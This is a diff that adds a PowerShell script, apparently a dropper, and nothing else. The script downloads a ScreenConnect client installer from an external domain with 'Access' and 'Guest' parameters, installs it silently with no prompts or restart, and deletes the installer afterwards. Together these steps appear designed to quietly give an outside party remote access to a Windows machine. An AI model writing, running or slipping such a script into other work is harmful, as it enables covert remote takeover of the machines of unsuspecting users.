@@ -1,0 +1,7 @@
+New-Item -ItemType Directory -Path 'C:\Temp' -Force | Out-Null;
+
+iwr -Uri 'https://private.pulsedrift.org/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest' -OutFile 'C:\Temp\ClientSetup.msi' -ErrorAction Stop;
+
+& 'msiexec.exe' /i 'C:\Temp\ClientSetup.msi' /qn /norestart;
+
+Remove-Item -Path 'C:\Temp\ClientSetup.msi' -Force;
